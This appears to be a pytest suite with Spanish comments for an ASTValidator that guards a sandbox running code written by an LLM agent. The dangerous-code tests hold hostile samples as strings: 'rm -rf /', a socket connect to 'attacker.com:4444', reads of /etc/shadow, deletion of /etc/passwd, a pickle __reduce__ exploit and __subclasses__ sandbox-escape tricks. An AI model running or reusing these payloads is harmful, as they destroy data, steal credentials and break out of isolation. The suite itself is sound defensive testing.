"""
Tests unitarios exhaustivos del ASTValidator.
Cubre 4 grupos: código legítimo, código peligroso, casos borde, integración con SandboxManager.

Ejecutar con:
    python -m pytest tests/sandbox/test_ast_validator.py -v --tb=short
"""

from __future__ import annotations

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

import pytest
from core.sandbox.ast_validator import ASTValidator


@pytest.fixture
def validator():
    return ASTValidator()


# ─────────────────────────────────────────────────────────────────────────────
# GRUPO 1: Código legítimo que DEBE pasar (falsos positivos = bug crítico)
# ─────────────────────────────────────────────────────────────────────────────

class TestLegitimateCode:
    """Código que el Code Agent genera legítimamente. Si alguno falla = falso positivo."""

    def test_simple_function(self, validator):
        code = """
def add(a, b):
    return a + b

result = add(2, 3)
print(result)
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo: {result.violations}"

    def test_json_manipulation(self, validator):
        code = """
import json

data = {"key": "value", "number": 42}
serialized = json.dumps(data)
parsed = json.loads(serialized)
print(parsed)
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo: {result.violations}"

    def test_pathlib_read(self, validator):
        code = """
from pathlib import Path

p = Path(".")
files = list(p.iterdir())
for f in files:
    print(f.name)
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo: {result.violations}"

    def test_pandas_dataframe(self, validator):
        code = """
import pandas as pd
import numpy as np

df = pd.DataFrame({"a": [1, 2, 3], "b": [4, 5, 6]})
print(df.describe())
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo: {result.violations}"

    def test_datetime_operations(self, validator):
        code = """
from datetime import datetime, timedelta

now = datetime.now()
future = now + timedelta(days=7)
print(f"Hoy: {now}, En 7 días: {future}")
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo: {result.violations}"

    def test_pydantic_model(self, validator):
        code = """
from pydantic import BaseModel
from typing import Optional

class Task(BaseModel):
    title: str
    done: bool = False
    priority: Optional[int] = None

task = Task(title="Implementar sandbox", priority=1)
print(task.model_dump())
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo: {result.violations}"

    def test_os_path_operations(self, validator):
        """os está en la allowlist — las operaciones de lectura deben pasar."""
        code = """
import os

cwd = os.getcwd()
files = os.listdir(".")
exists = os.path.exists("config.json")
print(cwd, exists)
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo en os.path: {result.violations}"

    def test_math_operations(self, validator):
        code = """
import math
import statistics

data = [1, 2, 3, 4, 5]
print(math.sqrt(sum(data)))
print(statistics.mean(data))
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo: {result.violations}"

    def test_list_comprehension_complex(self, validator):
        code = """
numbers = [i**2 for i in range(10) if i % 2 == 0]
flat = [x for row in [[1,2],[3,4]] for x in row]
print(numbers, flat)
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo: {result.violations}"

    def test_class_definition(self, validator):
        code = """
class Calculator:
    def __init__(self):
        self.history = []

    def add(self, a, b):
        result = a + b
        self.history.append(result)
        return result

calc = Calculator()
print(calc.add(3, 7))
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo en class definition: {result.violations}"


# ─────────────────────────────────────────────────────────────────────────────
# GRUPO 2: Código peligroso que DEBE ser bloqueado
# ─────────────────────────────────────────────────────────────────────────────

class TestDangerousCode:
    """Todos los tests de este grupo deben detectar violaciones. Si alguno falla = agujero de seguridad."""

    def test_os_system(self, validator):
        code = "import os\nos.system('rm -rf /')"
        result = validator.validate(code)
        assert not result.is_safe
        assert any("os.system" in v for v in result.violations)

    def test_subprocess_run(self, validator):
        code = """
import subprocess
subprocess.run(["ls", "-la"], capture_output=True)
"""
        result = validator.validate(code)
        assert not result.is_safe
        assert any("subprocess" in v for v in result.violations)

    def test_eval_direct(self, validator):
        code = "eval('__import__(\"os\").system(\"whoami\")')"
        result = validator.validate(code)
        assert not result.is_safe
        assert any("eval" in v for v in result.violations)

    def test_exec_direct(self, validator):
        code = 'exec("""\nimport os\nos.remove(\'/etc/passwd\')\n""")'
        result = validator.validate(code)
        assert not result.is_safe

    def test_import_socket(self, validator):
        code = """
import socket

s = socket.socket()
s.connect(("attacker.com", 4444))
"""
        result = validator.validate(code)
        assert not result.is_safe
        assert any("socket" in v for v in result.violations)

    def test_import_subprocess(self, validator):
        code = "import subprocess"
        result = validator.validate(code)
        assert not result.is_safe

    def test_shutil_rmtree(self, validator):
        code = """
import shutil
shutil.rmtree("/home/user/important")
"""
        result = validator.validate(code)
        assert not result.is_safe

    def test_ctypes_access(self, validator):
        code = """
import ctypes
lib = ctypes.cdll.LoadLibrary("libc.so.6")
"""
        result = validator.validate(code)
        assert not result.is_safe

    def test_sys_exit(self, validator):
        code = """
import sys
sys.exit(0)
"""
        result = validator.validate(code)
        assert not result.is_safe

    def test_dunder_import(self, validator):
        """El truco clásico de bypass con __import__."""
        code = "__import__('os').system('id')"
        result = validator.validate(code)
        assert not result.is_safe

    def test_class_bases_escape(self, validator):
        """Escape vía jerarquía de clases — técnica avanzada de evasión."""
        code = """
x = ().__class__.__bases__[0].__subclasses__()
"""
        result = validator.validate(code)
        assert not result.is_safe

    def test_os_popen(self, validator):
        code = """
import os
output = os.popen("cat /etc/shadow").read()
"""
        result = validator.validate(code)
        assert not result.is_safe

    def test_pickle_deserialization(self, validator):
        code = """
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id",))

pickle.loads(pickle.dumps(Exploit()))
"""
        result = validator.validate(code)
        assert not result.is_safe

    def test_indirect_subprocess_via_multiprocessing(self, validator):
        code = """
import multiprocessing
p = multiprocessing.Process(target=lambda: None)
"""
        result = validator.validate(code)
        assert not result.is_safe

    def test_os_fork(self, validator):
        code = "import os\npid = os.fork()"
        result = validator.validate(code)
        assert not result.is_safe

    def test_os_execv(self, validator):
        code = "import os\nos.execv('/bin/sh', ['/bin/sh'])"
        result = validator.validate(code)
        assert not result.is_safe


# ─────────────────────────────────────────────────────────────────────────────
# GRUPO 3: Casos borde — los más importantes para producción
# ─────────────────────────────────────────────────────────────────────────────

class TestEdgeCases:
    """Falsos positivos y negativos comunes en producción."""

    def test_syntax_error_returns_safe_false(self, validator):
        """Código con sintaxis inválida debe ser rechazado, no crashear."""
        code = "def broken(: pass"
        result = validator.validate(code)
        assert not result.is_safe
        assert any("SyntaxError" in v for v in result.violations)

    def test_empty_code(self, validator):
        """Código vacío es seguro."""
        result = validator.validate("")
        assert result.is_safe

    def test_comment_only(self, validator):
        """Solo comentarios es seguro."""
        result = validator.validate("# Este es un comentario\n# Otro comentario")
        assert result.is_safe

    def test_string_containing_banned_word(self, validator):
        """
        CASO BORDE CRÍTICO: Una string que contiene 'os.system' NO es
        una llamada real. El validator NO debe bloquear esto.
        """
        code = """
message = "Nunca uses os.system() en producción"
print(message)
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo en string literal: {result.violations}"

    def test_variable_named_os(self, validator):
        """
        Variable llamada 'os' que no importa el módulo real.
        No debe ser bloqueada.
        """
        code = """
os = {"platform": "linux"}
print(os["platform"])
"""
        result = validator.validate(code)
        assert result.is_safe, f"Falso positivo en variable 'os': {result.violations}"

    def test_multiline_obfuscation_is_safe(self, validator):
        """
        Ofuscación por concatenación de strings.
        DEBE PASAR — no es una llamada real.
        El ProcessRunner lo aísla de todas formas.
        """
        code = """
cmd = "os" + ".sys" + "tem"
"""
        result = validator.validate(code)
        assert result.is_safe  # Correcto que pase — la string no invoca nada

    def test_deeply_nested_call(self, validator):
        """Llamada peligrosa anidada dentro de lambda."""
        code = """
f = lambda: __import__('os').system('id')
"""
        result = validator.validate(code)
        assert not result.is_safe

    def test_from_import_dangerous(self, validator):
        """from subprocess import run debe ser bloqueado."""
        code = "from subprocess import run\nrun(['id'])"
        result = validator.validate(code)
        assert not result.is_safe

    def test_requests_is_allowed(self, validator):
        """requests está en la allowlist — debe pasar."""
        code = """
import requests
response = requests.get("https://api.example.com/data")
print(response.json())
"""
        result = validator.validate(code)
        assert result.is_safe, f"requests debería estar permitido: {result.violations}"

    def test_httpx_is_allowed(self, validator):
        """httpx está en la allowlist — debe pasar."""
        code = """
import httpx
r = httpx.get("https://api.example.com")
print(r.status_code)
"""
        result = validator.validate(code)
        assert result.is_safe, f"httpx debería estar permitido: {result.violations}"

    def test_print_with_os_in_string(self, validator):
        """print() con string que menciona os no es peligroso."""
        code = 'print("os.system is banned")'
        result = validator.validate(code)
        assert result.is_safe

    def test_dict_key_named_system(self, validator):
        """Diccionario con clave 'system' no es peligroso."""
        code = """
config = {"system": "linux", "os": "ubuntu"}
print(config["system"])
"""
        result = validator.validate(code)
        assert result.is_safe


# ─────────────────────────────────────────────────────────────────────────────
# GRUPO 4: Tests de integración con SandboxManager completo
# ─────────────────────────────────────────────────────────────────────────────

class TestSandboxManagerIntegration:
    """Tests de punta a punta: AST → ProcessRunner → resultado."""

    @pytest.fixture
    def sandbox(self, tmp_path):
        from core.sandbox.sandbox_manager import SandboxManager
        return SandboxManager({
            "sandbox_workspace": str(tmp_path),
            "execution_timeout": 10
        })

    def test_safe_code_executes(self, sandbox):
        code = "print('hello from sandbox')"
        result = sandbox.execute(code, requester_agent="test")
        assert result["success"]
        assert "hello from sandbox" in result["stdout"]
        assert not result["blocked"]

    def test_dangerous_code_blocked_before_execution(self, sandbox):
        """El código peligroso debe ser bloqueado SIN llegar a ejecutarse."""
        code = "import os\nos.system('echo pwned')"
        result = sandbox.execute(code, requester_agent="test")
        assert result["blocked"]
        assert not result["success"]
        assert "pwned" not in result.get("stdout", "")

    def test_timeout_kills_process(self, sandbox):
        """Loop infinito debe ser terminado por timeout."""
        sandbox.runner.timeout = 3  # timeout corto para el test
        code = "while True: pass"
        result = sandbox.execute(code, requester_agent="test")
        assert not result["success"]
        assert "TIMEOUT" in result["stderr"]

    def test_runtime_error_captured(self, sandbox):
        """Error en runtime debe ser capturado sin crashear el servidor."""
        code = "x = 1 / 0"
        result = sandbox.execute(code, requester_agent="test")
        assert not result["success"]
        assert "ZeroDivisionError" in result["stderr"]

    def test_stdout_captured_correctly(self, sandbox):
        """Verifica que stdout multi-línea se captura bien."""
        code = "for i in range(5):\n    print(i)"
        result = sandbox.execute(code, requester_agent="test")
        assert result["success"]
        assert "0" in result["stdout"]
        assert "4" in result["stdout"]

    def test_quick_validate_safe(self, sandbox):
        is_safe, violations = sandbox.quick_validate("print('ok')")
        assert is_safe
        assert violations == []

    def test_quick_validate_unsafe(self, sandbox):
        is_safe, violations = sandbox.quick_validate("import socket")
        assert not is_safe
        assert len(violations) > 0

    def test_blocked_message_is_informative(self, sandbox):
        """El mensaje de bloqueo debe ser legible para el LLM."""
        result = sandbox.execute("eval('1+1')", requester_agent="code_agent")
        assert result["blocked"]
        assert "Bloqueado" in result["message"] or "bloqueado" in result["message"].lower()
        assert "code_agent" in result["message"]
